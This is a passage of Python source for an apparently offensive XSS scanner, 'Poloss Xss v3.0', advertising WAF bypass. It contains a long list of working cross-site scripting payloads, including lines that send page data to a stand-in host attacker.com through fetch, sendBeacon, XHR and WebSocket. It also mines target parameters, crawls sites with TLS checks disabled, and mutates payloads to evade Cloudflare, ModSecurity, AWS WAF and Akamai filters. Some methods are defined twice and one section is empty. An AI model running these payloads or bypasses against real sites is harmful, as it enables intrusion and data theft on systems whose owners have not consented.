        advanced.append('<script>1.constructor.constructor("alert(document.domain)")()</script>')
        
        # Multi-level constructor
        advanced.append('<script>window.constructor.constructor.constructor("alert(document.domain)")()</script>')
        
        # ============ TIMER FUNCTIONS ============
        # setTimeout variations
        advanced.append('<script>setTimeout("alert(document.domain)")</script>')
        advanced.append('<script>setTimeout("alert(document.domain)",0)</script>')
        advanced.append('<script>setTimeout("alert(document.domain)",1)</script>')
        advanced.append('<script>setTimeout(alert,0,document.domain)</script>')
        advanced.append('<script>setTimeout.call(null,"alert(document.domain)",0)</script>')
        advanced.append('<script>setTimeout.apply(null,["alert(document.domain)",0])</script>')
        advanced.append('<script>window.setTimeout("alert(document.domain)")</script>')
        
        # setInterval variations
        advanced.append('<script>setInterval("alert(document.domain)")</script>')
        advanced.append('<script>setInterval("alert(document.domain)",1000)</script>')
        advanced.append('<script>setInterval(alert,1000,document.domain)</script>')
        
        # setImmediate and requestAnimationFrame
        advanced.append('<script>setImmediate&&setImmediate("alert(document.domain)")</script>')
        advanced.append('<script>requestAnimationFrame&&requestAnimationFrame("alert(document.domain)")</script>')
        
        # ============ LOCATION HIJACKING ============
        advanced.append('<script>location="javascript:alert(document.domain)"</script>')
        advanced.append('<script>location.href="javascript:alert(document.domain)"</script>')
        advanced.append('<script>location.assign("javascript:alert(document.domain)")</script>')
        advanced.append('<script>location.replace("javascript:alert(document.domain)")</script>')
        advanced.append('<script>location.pathname="javascript:alert(document.domain)"</script>')
        advanced.append('<script>location.search="?javascript:alert(document.domain)"</script>')
        advanced.append('<script>location.hash="#javascript:alert(document.domain)"</script>')
        
        # Via window
        advanced.append('<script>window.location="javascript:alert(document.domain)"</script>')
        advanced.append('<script>self.location="javascript:alert(document.domain)"</script>')
        advanced.append('<script>top.location="javascript:alert(document.domain)"</script>')
        advanced.append('<script>parent.location="javascript:alert(document.domain)"</script>')
        
        # ============ DOCUMENT WRITE VARIATIONS ============
        advanced.append('<script>document.write("<script>alert(document.domain)</script>")</script>')
        advanced.append('<script>document.writeln("<script>alert(document.domain)</script>")</script>')
        advanced.append('<script>document.write("<img src=x onerror=alert(document.domain)>")</script>')
        advanced.append('<script>document.write("<svg onload=alert(document.domain)>")</script>')
        advanced.append('<script>document.write("<body onload=alert(document.domain)>")</script>')
        advanced.append('<script>document.write("<iframe src=javascript:alert(document.domain)>")</script>')
        advanced.append('<script>document.write("<script>alert\\\("+document.domain+"\\\)</script>")</script>')
        
        # write with escaping
        advanced.append('<script>document.write(unescape("%3Cscript%3Ealert(document.domain)%3C/script%3E"))</script>')
        advanced.append('<script>document.write(decodeURIComponent("%3Cscript%3Ealert(document.domain)%3C/script%3E"))</script>')
        
        # ============ INNERHTML/OUTERHTML VARIATIONS ============
        advanced.append('<script>document.body.innerHTML="<img src=x onerror=alert(document.domain)>"</script>')
        advanced.append('<script>document.body.outerHTML="<img src=x onerror=alert(document.domain)>"</script>')
        advanced.append('<script>document.documentElement.innerHTML="<img src=x onerror=alert(document.domain)>"</script>')
        advanced.append('<script>document.head.innerHTML="<script>alert(document.domain)</script>"</script>')
        advanced.append('<script>document.getElementById("content").innerHTML="<img src=x onerror=alert(document.domain)>"</script>')
        advanced.append('<script>document.querySelector("div").innerHTML="<img src=x onerror=alert(document.domain)>"</script>')
        
        # Using insertAdjacentHTML
        advanced.append('<script>document.body.insertAdjacentHTML("beforeend","<img src=x onerror=alert(document.domain)>")</script>')
        advanced.append('<script>document.body.insertAdjacentHTML("afterbegin","<script>alert(document.domain)</script>")</script>')
        
        # ============ IMPORTSCRIPTS & WORKER BYPASSES ============
        advanced.append('<script>importScripts("data:text/javascript,alert(document.domain)")</script>')
        advanced.append('<script>new Worker("data:text/javascript,alert(document.domain)")</script>')
        advanced.append('<script>new SharedWorker("data:text/javascript,alert(document.domain)")</script>')
        
        # Blob based workers
        advanced.append('<script>var blob=new Blob(["alert(document.domain)"],{type:"text/javascript"});new Worker(URL.createObjectURL(blob))</script>')
        
        # ============ CREATECONTEXTUALFRAGMENT & RANGE ============
        advanced.append('<script>document.createRange().createContextualFragment("<script>alert(document.domain)</script>")</script>')
        advanced.append('<script>var range=document.createRange();range.selectNode(document.body);range.createContextualFragment("<img src=x onerror=alert(document.domain)>")</script>')
        
        # ============ BASE TAG HIJACKING ============
        advanced.append('<base href="javascript:alert(document.domain)//">')
        advanced.append('<base href="data:text/html,<script>alert(document.domain)</script>">')
        advanced.append('<base href="//attacker.com/xss.js">')
        advanced.append('<base target="_blank" href="javascript:alert(document.domain)">')
        
        # ============ FORM HIJACKING ============
        advanced.append('<form action="javascript:alert(document.domain)"><input type=submit></form>')
        advanced.append('<form action="data:text/html,<script>alert(document.domain)</script>"><input type=submit></form>')
        advanced.append('<form><button formaction="javascript:alert(document.domain)">Click</button></form>')
        advanced.append('<form><input type=image src=x onerror=alert(document.domain)></form>')
        advanced.append('<form id=f></form><button form=f formaction="javascript:alert(document.domain)">Submit</button>')
        
        # ============ IFRAME TECHNIQUES ============
        advanced.append('<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>')
        advanced.append('<iframe srcdoc="<img src=x onerror=alert(parent.document.domain)>"></iframe>')
        advanced.append('<iframe src="javascript:alert(document.domain)"></iframe>')
        advanced.append('<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>')
        advanced.append('<iframe sandbox="allow-scripts" src="data:text/html,<script>alert(document.domain)</script>"></iframe>')
        
        # ============ OBJECT/EMBED TECHNIQUES ============
        advanced.append('<object data="data:text/html,<script>alert(document.domain)</script>"></object>')
        advanced.append('<object data="javascript:alert(document.domain)"></object>')
        advanced.append('<embed src="data:text/html,<script>alert(document.domain)</script>">')
        advanced.append('<embed src="javascript:alert(document.domain)">')
        advanced.append('<applet code="javascript:alert(document.domain)"></applet>')
        
        # ============ META TAG REDIRECT ============
        advanced.append('<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">')
        advanced.append('<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(document.domain)</script>">')
        
        # ============ LINK TAG INJECTION ============
        advanced.append('<link rel=import href="data:text/html,<script>alert(document.domain)</script>">')
        advanced.append('<link rel=stylesheet href="javascript:alert(document.domain)">')
        advanced.append('<link rel=stylesheet href="data:text/css,.x{background-image:url(javascript:alert(document.domain))}">')
        
        # ============ STYLE TAG INJECTION ============
        advanced.append('<style>@import "javascript:alert(document.domain)";</style>')
        advanced.append('<style>body{background-image:url("javascript:alert(document.domain)")}</style>')
        advanced.append('<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(document.domain)"></div>')
        
        # ============ SVG ADVANCED TECHNIQUES ============
        advanced.append('<svg><script>alert(document.domain)</script></svg>')
        advanced.append('<svg><g onload="alert(document.domain)"></g></svg>')
        advanced.append('<svg><a xlink:href="javascript:alert(document.domain)"><text>Click</text></a></svg>')
        advanced.append('<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.domain)</script></body></foreignObject></svg>')
        
        # ============ MATHML INJECTION ============
        advanced.append('<math><mi xlink:href="data:text/html,<script>alert(document.domain)</script>">test</mi></math>')
        advanced.append('<math><mo xlink:href="javascript:alert(document.domain)">test</mo></math>')
        
        # ============ TEMPLATE TAG BYPASS ============
        advanced.append('<template><script>alert(document.domain)</script></template>')
        advanced.append('<template onload="alert(document.domain)"></template>')
        
        # ============ CUSTOM ELEMENTS ============
        advanced.append('<xss onload="alert(document.domain)"></xss>')
        advanced.append('<div is="xss" onload="alert(document.domain)"></div>')
        
        # ============ DATALIST TECHNIQUE ============
        advanced.append('<input list="d" onfocus="alert(document.domain)"><datalist id="d"></datalist>')
        
        # ============ DETAILS TAG ============
        advanced.append('<details ontoggle="alert(document.domain)"><summary>Click</summary></details>')
        advanced.append('<details open ontoggle="alert(document.domain)"></details>')
        
        # ============ DIALOG TAG ============
        advanced.append('<dialog open onclose="alert(document.domain)"></dialog>')
        
        # ============ MARQUEE TAG ============
        advanced.append('<marquee onstart="alert(document.domain)">test</marquee>')
        advanced.append('<marquee loop=1 onbounce="alert(document.domain)">test</marquee>')
        
        # ============ VIDEO/AUDIO TECHNIQUES ============
        advanced.append('<video><source onerror="alert(document.domain)"></video>')
        advanced.append('<audio><source onerror="alert(document.domain)"></audio>')
        advanced.append('<video poster="javascript:alert(document.domain)"></video>')
        
        # ============ CANVAS DATA URL ============
        advanced.append('<canvas id="c"></canvas><script>c.getContext("2d").drawImage(document.body,0,0);location="data:image/png,"+c.toDataURL()</script>')
        
        # ============ WEBSOCKET INJECTION ============
        advanced.append('<script>new WebSocket("ws://attacker.com/xss")</script>')
        advanced.append('<script>new WebSocket("ws://"+document.domain+"/xss")</script>')
        
        # ============ WEBRTC TECHNIQUES ============
        advanced.append('<script>new RTCPeerConnection({"iceServers":[{"urls":"stun:"+document.domain}]})</script>')
        
        # ============ NOTIFICATION API ============
        advanced.append('<script>Notification.requestPermission().then(()=>new Notification(document.domain))</script>')
        
        # ============ GEOLOCATION API ============
        advanced.append('<script>navigator.geolocation.getCurrentPosition(()=>alert(document.domain))</script>')
        
        # ============ CLIPBOARD API ============
        advanced.append('<script>navigator.clipboard.writeText(document.domain).then(()=>alert("Copied: "+document.domain))</script>')
        
        # ============ INDEXEDDB ============
        advanced.append('<script>indexedDB.open(document.domain)</script>')
        
        # ============ LOCALSTORAGE/SESSIONSTORAGE ============
        advanced.append('<script>localStorage.setItem("x",document.domain);alert(localStorage.getItem("x"))</script>')
        advanced.append('<script>sessionStorage.setItem("x",document.domain);alert(sessionStorage.getItem("x"))</script>')
        
        # ============ POSTMESSAGE EXPLOITATION ============
        advanced.append('<script>postMessage(document.domain,"*")</script>')
        advanced.append('<script>window.opener&&window.opener.postMessage(document.domain,"*")</script>')
        advanced.append('<script>window.parent.postMessage(document.domain,"*")</script>')
        
        # ============ BEACON API ============
        advanced.append('<script>navigator.sendBeacon("//attacker.com/log",document.domain)</script>')
        
        # ============ FETCH API ============
        advanced.append('<script>fetch("//attacker.com/log?data="+document.domain)</script>')
        advanced.append('<script>fetch("data:text/html,"+document.domain)</script>')
        
        # ============ XHR TECHNIQUES ============
        advanced.append('<script>var x=new XMLHttpRequest();x.open("GET","//attacker.com/log?data="+document.domain);x.send()</script>')
        advanced.append('<script>var x=new XMLHttpRequest();x.open("POST","//attacker.com/log",true);x.send(document.domain)</script>')
        
        # ============ DYNAMIC SCRIPT LOADING ============
        advanced.append('<script>var s=document.createElement("script");s.src="data:text/javascript,alert(document.domain)";document.body.appendChild(s)</script>')
        advanced.append('<script>document.write("<script src=data:text/javascript,alert(document.domain)></script>")</script>')
        
        # ============ IMPORT DYNAMIC ============
        advanced.append('<script>import("data:text/javascript,alert(document.domain)")</script>')
        
        # ============ ERROR EVENT PROPAGATION ============
        advanced.append('<script>window.onerror=function(){alert(document.domain)};throw document.domain</script>')
        advanced.append('<script>addEventListener("error",function(){alert(document.domain)});throw new Error(document.domain)</script>')
        
        # ============ PROMISE BASED ============
        advanced.append('<script>Promise.resolve(document.domain).then(alert)</script>')
        advanced.append('<script>new Promise(r=>r(document.domain)).then(alert)</script>')
        
        # ============ GENERATOR FUNCTIONS ============
        advanced.append('<script>function* g(){yield alert(document.domain)};g().next()</script>')
        
        # ============ ASYNC/AWAIT ============
        advanced.append('<script>async function f(){await alert(document.domain)};f()</script>')
        
        # ============ PROXY OBJECT ============
        
        # ============ REFLECT API ============
        advanced.append('<script>Reflect.apply(alert,window,[document.domain])</script>')
        advanced.append('<script>Reflect.construct(Function,["alert(document.domain)"])</script>')
        
        # ============ ATOMIC OPERATIONS ============
        advanced.append('<script>Atomics.store(new Int32Array(new SharedArrayBuffer(4)),0,alert(document.domain))</script>')
        
        # ============ WASM BYPASS (theoretical) ============
        advanced.append('<script>WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0])).then(m=>alert(document.domain))</script>')
        
        # ============ SERVICE WORKER ============
        advanced.append('<script>navigator.serviceWorker.register("data:text/javascript,"+document.domain)</script>')
        
        # ============ BROADCAST CHANNEL ============
        advanced.append('<script>new BroadcastChannel("xss").postMessage(document.domain)</script>')
        
        # ============ SHARED WORKER ============
        advanced.append('<script>new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].postMessage(document.domain)")</script>')
        
        # ============ MUTATION OBSERVER ============
        advanced.append('<script>new MutationObserver(()=>alert(document.domain)).observe(document,{childList:true})</script>')
        
        # ============ INTERSECTION OBSERVER ============
        advanced.append('<script>new IntersectionObserver(()=>alert(document.domain)).observe(document.body)</script>')
        
        # ============ RESIZE OBSERVER ============
        advanced.append('<script>new ResizeObserver(()=>alert(document.domain)).observe(document.body)</script>')
        
        # ============ PERFORMANCE TIMING ============
        advanced.append('<script>performance.mark(document.domain);performance.getEntriesByName(document.domain)[0]&&alert(document.domain)</script>')
        
        # ============ CRYPTO API ============
        advanced.append('<script>crypto.subtle.digest("SHA-256",new TextEncoder().encode(document.domain)).then(()=>alert(document.domain))</script>')
        
        # ============ INTERNATIONALIZATION API ============
        advanced.append('<script>new Intl.DateTimeFormat().format(new Date(document.domain))&&alert(document.domain)</script>')
        
        return advanced
    
    def print_banner(self):
        """Display enhanced tool banner"""
        banner = f"""
    {Fore.CYAN}{'='*80}
    {Fore.YELLOW}
    ██████╗  ██████╗ ██╗      ██████╗ ███████╗███████╗    
    ██╔══██╗██╔═══██╗██║     ██╔═══██╗██╔════╝██╔════╝    
    ██████╔╝██║   ██║██║     ██║   ██║███████╗███████╗    
    ██╔═══╝ ██║   ██║██║     ██║   ██║╚════██║╚════██║
    ██║     ╚██████╔╝███████╗╚██████╔╝███████║███████║
    ╚═╝      ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝
    {Fore.GREEN}                          Poloss Xss v3.0
    {Fore.CYAN}                   Advanced XSS Scanner with WAF Bypass
    {'='*80}
    {Fore.RESET}
    [+] Target: {self.target_url}
    [+] Session ID: {self.session_id}
    [+] Platform: {self.platform}
    [+] Threads: {self.options.get('threads', 10)}
    [+] Timeout: {self.options.get('timeout', 10)}s
    [+] Mode: {self.options.get('mode', 'comprehensive')}
    [+] Delay: {self.options.get('delay', 0.1)}s
    [+] WAF Mode: {Fore.GREEN if self.no_waf_mode else Fore.YELLOW}{'DISABLED' if self.no_waf_mode else 'ENABLED'}{Fore.RESET}
    {Fore.CYAN}{'='*80}{Fore.RESET}
    """
        print(banner)
    
    # ==============================
    # 1. ENHANCED PARAMETER MINING
    # ==============================
    

    def mine_parameters(self):
        """
        Enhanced parameter mining from all sources
        """
        print(f"\n{Fore.GREEN}[1] PARAMETER MINING ENGINE{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")
        
        try:
            # Reset discovered parameters
            self.discovered_params = {
                'url': [],
                'form': [],
                'header': [],
                'json': [],
                'cookie': [],
                'file': []
            }
            
            # Import warnings untuk disable SSL warnings
            import warnings
            from urllib3.exceptions import InsecureRequestWarning
            warnings.filterwarnings('ignore', category=InsecureRequestWarning)
            
            # Initial request
            response = self.session.get(self.target_url, 
                                      timeout=self.options.get('timeout', 10),
                                      allow_redirects=True,
                                      verify=False)  # Added verify=False for SSL issues
            self.stats['requests_sent'] += 1
            
            # Extract from all sources
            url_params = self.extract_url_parameters(response.url)
            form_params = self.extract_form_parameters(response.text)
            header_params = self.extract_header_parameters()
            json_params = self.extract_json_parameters(response.text)
            cookie_params = self.extract_cookie_parameters()
            file_params = self.extract_file_parameters(response.text)
            
            # Store parameters
            self.discovered_params['url'].extend(url_params)
            self.discovered_params['form'].extend(form_params)
            self.discovered_params['header'].extend(header_params)
            self.discovered_params['json'].extend(json_params)
            self.discovered_params['cookie'].extend(cookie_params)
            self.discovered_params['file'].extend(file_params)
            
            # Extract from JavaScript with better patterns
            self.extract_js_parameters_enhanced(response.text)
            
            # Extract from AJAX calls patterns
            self.extract_ajax_patterns_enhanced(response.text)
            
            # Extract from HTML attributes
            self.extract_html_attributes(response.text)
            
            # Crawl for more parameters
            if self.options.get('crawl', True):
                self.enhanced_crawl_v2(response.text)
            
            # Display results
            self.display_parameter_summary()
            
            return self.discovered_params
            
        except Exception as e:
            logger.error(f"Parameter mining failed: {e}")
            print(f"{Fore.RED}[!] Parameter mining error: {e}{Fore.RESET}")
            return {}

    def extract_url_parameters(self, url):
        """Enhanced URL parameter extraction"""
        params = []
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            
            for name in query:
                params.append({
                    'name': name,
                    'value': query[name][0] if query[name] else '',
                    'type': 'url'
                })
            
            # Also check path parameters (like REST APIs)
            path_parts = parsed.path.strip('/').split('/')
            for i, part in enumerate(path_parts):
                if '=' in part:
                    # Handle path parameters like /users/id=123
                    try:
                        name, value = part.split('=', 1)
                        params.append({
                            'name': name,
                            'value': value,
                            'type': 'path',
                            'index': i
                        })
                    except:
                        pass
                elif part and not part.isdigit() and len(part) < 50:
                    # Could be a parameter name without value
                    params.append({
                        'name': f'path_param_{i}',
                        'value': part,
                        'type': 'path',
                        'index': i
                    })
                    
        except Exception as e:
            logger.debug(f"URL parameter extraction error: {e}")
        
        return params
    
    def extract_header_parameters(self, *args, **kwargs):
        """Extract injectable headers"""
        headers = [
            "User-Agent", "Referer", "X-Forwarded-For",
            "X-Client-IP", "X-Originating-IP"
        ]
        return [{'name': h, 'type': 'header'} for h in headers]
    
    def extract_json_parameters(self, html=None, *args, **kwargs):
        """Extract JSON-like parameters (basic support)"""
        params = []
        try:
            json_candidates = re.findall(r'\{.*?\}', html or "")
            for jc in json_candidates:
                try:
                    obj = json.loads(jc)
                    for k in obj.keys():
                        params.append({'name': k, 'type': 'json'})
                except:
                    continue
        except:
            pass
        return params
    
    def extract_cookie_parameters(self, *args, **kwargs):
        """Extract cookies as injectable parameters"""
        cookies = self.session.cookies.get_dict()
        return [{'name': c, 'type': 'cookie'} for c in cookies]
    
    def extract_json_parameters(self, html):
        """Extract JSON-like parameters (basic support)"""
        params = []
        try:
            json_candidates = re.findall(r'\{.*?\}', html)
            for jc in json_candidates:
                try:
                    obj = json.loads(jc)
                    for k in obj.keys():
                        params.append({'name': k, 'type': 'json'})
                except:
                    continue
        except:
            pass
        return params
    
    def extract_cookie_parameters(self):
        """Extract cookies as injectable parameters"""
        cookies = self.session.cookies.get_dict()
        return [{'name': c, 'type': 'cookie'} for c in cookies]
    
    def extract_js_parameters(self, html_content):
        """Extract parameters from JavaScript code"""
        # Find JavaScript variables that might be parameters
        js_patterns = [
            r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']',
            r'let\s+(\w+)\s*=\s*["\']([^"\']+)["\']',
            r'const\s+(\w+)\s*=\s*["\']([^"\']+)["\']',
            r'(\w+)\s*:\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in js_patterns:
            matches = re.finditer(pattern, html_content, re.MULTILINE | re.DOTALL)
            for match in matches:
                param_name = match.group(1)
                param_value = match.group(2)
                
                # Skip common JS variables
                if param_name in ['i', 'j', 'k', 'x', 'y', 'z', 'temp', 'tmp']:
                    continue
                
                self.discovered_params['json'].append({
                    'name': f'js_var_{param_name}',
                    'value': param_value,
                    'type': 'javascript'
                })

    def extract_form_parameters(self, html):
        """Enhanced form parameter extraction"""
        params = []
        try:
            soup = BeautifulSoup(html, "html.parser")
            for form in soup.find_all("form"):
                method = form.get("method", "get").lower()
                action = form.get("action", "")
                form_id = form.get("id", "")
                form_name = form.get("name", "")
                
                # Resolve action URL
                if action:
                    action_url = urllib.parse.urljoin(self.target_url, action)
                else:
                    action_url = self.target_url
                
                for inp in form.find_all(["input", "textarea", "select", "button"]):
                    name = inp.get("name")
                    input_type = inp.get("type", "text")
                    value = inp.get("value", "")
                    
                    if name:
                        params.append({
                            'name': name,
                            'value': value,
                            'type': 'form',
                            'input_type': input_type,
                            'form_method': method,
                            'form_action': action_url,
                            'form_id': form_id,
                            'form_name': form_name
                        })
                        
        except Exception as e:
            logger.debug(f"Form parameter extraction error: {e}")
        
        return params

    def extract_ajax_patterns_enhanced(self, html_content):
        """Enhanced AJAX pattern extraction"""
        try:
            ajax_patterns = [
                r'\.ajax\s*\(\s*{[^}]*data\s*:\s*{([^}]+)}',
                r'\.post\s*\(\s*["\'][^"\']+["\']\s*,\s*{([^}]+)}',
                r'\.get\s*\(\s*["\'][^"\']+["\']\s*,\s*{([^}]+)}',
                r'fetch\s*\(\s*["\'][^"\']+["\']\s*,\s*{[^}]*body\s*:\s*JSON\.stringify\s*\(\s*{([^}]+)}',
                r'axios\.(?:post|get|put|delete|patch)\s*\(\s*["\'][^"\']+["\']\s*,\s*{([^}]+)}',
            ]
            
            for pattern in ajax_patterns:
                matches = re.finditer(pattern, html_content, re.MULTILINE | re.DOTALL)
                for match in matches:
                    params_text = match.group(1)
                    # Extract key-value pairs
                    kv_pairs = re.finditer(r'(\w+)\s*:\s*["\']?([^"\',}]+)["\']?', params_text)
                    for kv in kv_pairs:
                        param_name = kv.group(1).strip()
                        param_value = kv.group(2).strip()
                        
                        if param_name and len(param_name) > 1:
                            self.discovered_params['json'].append({
                                'name': f'ajax_{param_name}',
                                'value': param_value,
                                'type': 'ajax',
                                'context': 'ajax_request'
                            })
                            
        except Exception as e:
            logger.debug(f"AJAX pattern extraction error: {e}")
    
    def extract_ajax_patterns(self, html_content):
        """Extract parameters from AJAX call patterns"""
        ajax_patterns = [
            r'\.ajax\s*\(\s*{([^}]+)}\)',
            r'\.post\s*\(\s*["\'][^"\']+["\']\s*,\s*{([^}]+)}',
            r'\.get\s*\(\s*["\'][^"\']+["\']\s*,\s*{([^}]+)}',
            r'fetch\s*\(\s*["\'][^"\']+["\']\s*,\s*{([^}]+)}',
        ]
        
        for pattern in ajax_patterns:
            matches = re.finditer(pattern, html_content, re.MULTILINE | re.DOTALL)
            for match in matches:
                params_text = match.group(1)
                # Extract key-value pairs
                kv_pairs = re.finditer(r'(\w+)\s*:\s*["\']?([^"\',}]+)["\']?', params_text)
                for kv in kv_pairs:
                    param_name = kv.group(1)
                    param_value = kv.group(2).strip()
                    
                    self.discovered_params['json'].append({
                        'name': f'ajax_{param_name}',
                        'value': param_value,
                        'type': 'ajax'
                    })
    
    def enhanced_crawl(self, html_content):
        """Enhanced crawling for more parameters"""
        soup = BeautifulSoup(html_content, 'html.parser')
        visited_urls = set()
        urls_to_visit = []
        
        # Collect all links
        for link in soup.find_all(['a', 'link'], href=True):
            href = link['href']
            if href and not href.startswith(('#', 'mailto:', 'tel:', 'javascript:')):
                full_url = urllib.parse.urljoin(self.target_url, href)
                if full_url not in visited_urls:
                    urls_to_visit.append(full_url)
        
        # Collect all form actions
        for form in soup.find_all('form', action=True):
            action = form['action']
            if action:
                full_url = urllib.parse.urljoin(self.target_url, action)
                if full_url not in visited_urls:
                    urls_to_visit.append(full_url)
        
        # Limit crawling depth
        max_crawl = self.options.get('max_crawl', 10)
        urls_to_visit = urls_to_visit[:max_crawl]
        
        print(f"[*] Crawling {len(urls_to_visit)} additional pages...")
        
        for url in urls_to_visit:
            try:
                # Skip external domains
                if urllib.parse.urlparse(url).netloc != urllib.parse.urlparse(self.target_url).netloc:
                    continue
                
                resp = self.session.get(url, timeout=5)
                self.stats['requests_sent'] += 1
                visited_urls.add(url)
                
                # Extract parameters from new page
                self.extract_form_parameters(resp.text)
                self.extract_url_parameters(resp.url)
                self.extract_js_parameters(resp.text)
                
                # Brief pause to avoid rate limiting
                time.sleep(0.1)
                
            except Exception as e:
                logger.debug(f"Crawl error for {url}: {e}")
                continue
    
    # ==============================
    # 2. SMART REFLECTION DETECTION
    # ==============================
    
    def detect_reflection_points(self, param_name, test_value, response_text):
        """
        Enhanced reflection detection
        """
        reflection_contexts = []
        
        # Generate unique marker
        marker = f"XSS_REFLECT_{random.randint(10000, 99999)}"
        
        # Test patterns for different contexts
        test_patterns = {
            'html_body': f'>{marker}<',
            'html_comment': f'<!--{marker}-->',
            'html_attribute': f'"{marker}"',
            'html_attribute_single': f"'{marker}'",
            'javascript_string': f'"{marker}"',
            'javascript_string_single': f"'{marker}'",
            'javascript_template': f'`{marker}`',
            'url': marker,
            'css': marker,
            'script_tag': f'<script>{marker}</script>',
            'style_tag': f'<style>{marker}</style>',
        }
        
        # Check each context
        for context, pattern in test_patterns.items():
            if pattern in response_text:
                # Find where our actual test value appears in similar context
                context_patterns = {
                    'html_body': r'>[^<]*' + re.escape(test_value) + r'[^<]*<',
                    'html_comment': r'<!--[^-]*' + re.escape(test_value) + r'[^-]*-->',
                    'html_attribute': r'"[^"]*' + re.escape(test_value) + r'[^"]*"',
                    'html_attribute_single': r"'[^']*" + re.escape(test_value) + r"[^']*'",
                    'javascript_string': r'"[^"]*' + re.escape(test_value) + r'[^"]*"',
                    'javascript_string_single': r"'[^']*" + re.escape(test_value) + r"[^']*'",
                    'javascript_template': r'`[^`]*' + re.escape(test_value) + r'[^`]*`',
                    'url': r'(?:href|src|action|data)\s*=\s*["\'][^"\']*' + re.escape(test_value) + r'[^"\']*["\']',
                    'css': r'style\s*=\s*["\'][^"\']*' + re.escape(test_value) + r'[^"\']*["\']',
                    'script_tag': r'<script[^>]*>[^<]*' + re.escape(test_value) + r'[^<]*</script>',
                    'style_tag': r'<style[^>]*>[^<]*' + re.escape(test_value) + r'[^<]*</style>',
                }
                
                if context in context_patterns:
                    matches = re.finditer(context_patterns[context], response_text, re.IGNORECASE | re.DOTALL)
                    for match in matches:
                        reflection_contexts.append({
                            'context': context,
                            'position': match.start(),
                            'snippet': self.safe_truncate(match.group(), 150),
                            'raw_match': match.group(),
                            'length': len(match.group())
                        })
        
        # Also check for direct reflection
        positions = [m.start() for m in re.finditer(re.escape(test_value), response_text)]
        for pos in positions:
            reflection_contexts.append({
                'context': 'direct',
                'position': pos,
                'snippet': self.safe_truncate(test_value, 100),
                'raw_match': test_value,
                'length': len(test_value)
            })
        
        return reflection_contexts
    
    def safe_truncate(self, text, length):
        """Safely truncate text for display"""
        if not text:
            return ""
        if len(text) <= length:
            return text
        return text[:length] + "..."
    
    # ==============================
    # 3. ENHANCED PAYLOAD MUTATION
    # ==============================
    
    class PayloadMutator:
        """Enhanced payload mutation engine"""
        
        @staticmethod
        def mutate_for_context(base_payload, context_type, waf_type=None):
            """Mutate payload based on context and WAF"""
            mutations = []
            
            # Base mutation
            mutations.append(base_payload)
            
            # Context-specific mutations
            if context_type == 'html_body':
                mutations.extend([
                    f'>{base_payload}<',
                    f'</title>{base_payload}',
                    f'</style>{base_payload}',
                    f'</script>{base_payload}',
                    f'<!--{base_payload}-->',
                    f'<div>{base_payload}</div>',
                    f'<span>{base_payload}</span>',
                    f'<p>{base_payload}</p>',
                ])
            elif context_type == 'html_attribute':
                mutations.extend([
                    f'"{base_payload}"',
                    f"'{base_payload}'",
                    f'`{base_payload}`',
                    f'" {base_payload}',
                    f"' {base_payload}",
                    f'"{base_payload}',
                    f"'{base_payload}",
                    f'`{base_payload}',
                    f'{base_payload}"',
                    f"{base_payload}'",
                    f'{base_payload}`',
                ])
            elif context_type == 'javascript':
                mutations.extend([
                    f'"{base_payload}"',
                    f"'{base_payload}'",
                    f'`{base_payload}`',
                    f'";{base_payload};//',
                    f"';{base_payload};//",
                    f'`;{base_payload};//',
                    f'\\"{base_payload}\\""',
                    f"\\'{base_payload}\\'",
                    f'${{{base_payload}}}',
                ])
            elif context_type == 'url':
                mutations.extend([
                    f'javascript:{base_payload}',
                    f'data:text/html,{base_payload}',
                    f'jav&#x61;script:{base_payload}',
                    f'jav&#x09;ascript:{base_payload}',
                    f'jav&#x0a;ascript:{base_payload}',
                    f'jav&#x0d;ascript:{base_payload}',
                    f'jav&#x00;ascript:{base_payload}',
                ])
            
            # WAF-specific mutations
            if waf_type:
                mutations.extend(PayloadMutator.waf_specific_mutations(base_payload, waf_type))
            
            # Advanced mutations
            mutations.extend(PayloadMutator.advanced_mutations(base_payload))
            
            return list(OrderedDict.fromkeys(mutations))  # Remove duplicates
        
        @staticmethod
        def waf_specific_mutations(payload, waf_type):
            """Generate WAF-specific mutations"""
            mutations = []
            
            if waf_type == 'Cloudflare':
                # Cloudflare specific bypasses
                mutations.extend([
                    payload.replace('script', 'scr\x69pt'),  # Unicode 'i'
                    payload.replace('onload', 'on\x6c\x6f\x61\x64'),  # Unicode hex
                    payload.replace('alert', 'al\x65rt'),
                    payload.replace('<', '\x3c'),  # Hex for <
                    payload.replace('>', '\x3e'),  # Hex for >
                    payload + '/*' + 'A'*100 + '*/',  # Large comment
                ])
            elif waf_type == 'ModSecurity':
                # ModSecurity bypasses
                mutations.extend([
                    payload.replace(' ', '/**/'),
                    payload.replace('=', '=>'),
                    '<>' + payload,
                    payload + ' ' * 100,  # Extra spaces
                    payload.replace('alert', 'al' + chr(0x65) + 'rt'),  # Char code
                ])
            elif waf_type == 'AWS WAF':
                # AWS WAF bypasses
                mutations.extend([
                    payload.replace('<', '%3C').replace('>', '%3E'),
                    payload.replace('script', 'scr\ript'),  # Backslash
                    payload.replace('onload', 'on\\load'),
                    payload + ';' * 10,  # Multiple semicolons
                ])
            elif waf_type == 'Akamai':
                # Akamai bypasses
                mutations.extend([
                    payload.replace(' ', '\t'),
                    payload.replace('=', '\x3d'),
                    payload.lower(),
                    payload.upper(),
                ])
            
            return mutations
        
        @staticmethod
        def advanced_mutations(payload):
            """Advanced mutation techniques"""
            mutations = []
            
            # Case variations
            mutations.append(payload.upper())
            mutations.append(payload.lower())
            mutations.append(payload.title())
            mutations.append(payload.swapcase())
            
            # Encoding variations
            # HTML entities
            html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
            mutations.append(html_encoded)
            
            # URL encoding
            url_encoded = quote(payload)
            mutations.append(url_encoded)
            
            # Double URL encoding
            double_encoded = quote(quote(payload))
            mutations.append(double_encoded)
            
            # Unicode encoding
